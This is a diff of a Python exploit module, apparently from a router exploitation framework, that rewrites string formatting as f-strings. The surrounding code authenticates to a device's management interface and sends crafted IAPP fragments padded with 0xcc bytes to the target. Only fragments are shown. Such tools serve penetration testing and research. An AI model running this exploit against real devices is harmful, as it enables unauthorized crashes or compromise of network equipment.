@@ -73,10 +73,10 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         if not self.check():
-            print_error("Management interface not reachable on {}:{}".format(self.target, self.port))
+            print_error(f"Management interface not reachable on {self.target}:{self.port}")
             return
 
-        print_status("Attempting authentication as '{}' ...".format(self.username))
+        print_status(f"Attempting authentication as '{self.username}' ...")
         token = self._authenticate()
 
         if token is None:
@@ -115,15 +115,15 @@ class Exploit(HTTPClient):
                 pass
 
         cred = base64.b64encode(
-            "{}:{}".format(self.username, self.password).encode()
+            f"{self.username}:{self.password}".encode()
         ).decode()
         resp = self.http_request(
             method="GET",
             path="/",
-            headers={"Authorization": "Basic {}".format(cred)},
+            headers={"Authorization": f"Basic {cred}"},
         )
         if resp is not None and resp.status_code == 200:
-            return "basic:{}".format(cred)
+            return f"basic:{cred}"
 
         return None
 
@@ -177,9 +177,7 @@ class Exploit(HTTPClient):
         fill = b"\xcc" * self.fragment_size
 
         print_status(
-            "Sending {} authenticated IAPP fragment(s) ({} bytes each) to {}:{}".format(
-                self.fragment_count, self.fragment_size, self.target, self.iapp_port
-            )
+            f"Sending {self.fragment_count} authenticated IAPP fragment(s) ({self.fragment_size} bytes each) to {self.target}:{self.iapp_port}"
         )
 
         for i in range(self.fragment_count):
